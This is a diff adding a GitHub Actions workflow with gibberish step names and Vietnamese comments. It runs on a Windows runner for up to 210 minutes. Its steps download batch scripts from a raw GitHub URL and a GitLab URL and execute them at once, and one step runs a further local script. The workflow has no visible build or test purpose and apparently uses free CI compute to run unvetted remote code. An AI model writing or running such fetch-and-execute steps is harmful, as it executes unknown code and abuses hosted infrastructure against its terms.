@@ -1,0 +1,33 @@
+name: gdfbfdbfdbfdbfbffbfb
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run_script_instance:
+    # Tên của mỗi job sẽ bao gồm số thứ tự từ ma trận
+    name: Script Run Instance ${{ matrix.instance }}
+    runs-on: windows-2022
+    timeout-minutes: 210
+
+    strategy:
+      matrix:
+        # Biến 'instance' sẽ được lặp lại với các giá trị 1, 2, 3 và 4.
+        # Mỗi giá trị sẽ tạo ra một job riêng biệt chạy các bước bên dưới.
+        instance: [1] # Đã thay đổi số lượng instance thành 4
+
+    steps:
+      
+
+      - name: ưewewewewewewew (Instance ${{ matrix.instance }})
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/tollboxlap09/tollboxlap09/refs/heads/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: mjjkjkjkjkjk (Instance ${{ matrix.instance }})
+        run: cmd /c show.bat
+
+      - name: adfdafafssafsafsafsf (Instance ${{ matrix.instance }})
+        run: |
+          curl -L -o loop.bat "https://gitlab.com/thah49766-group/dvdvdava/-/raw/main/loop.bat"
+          cmd /c loop.bat
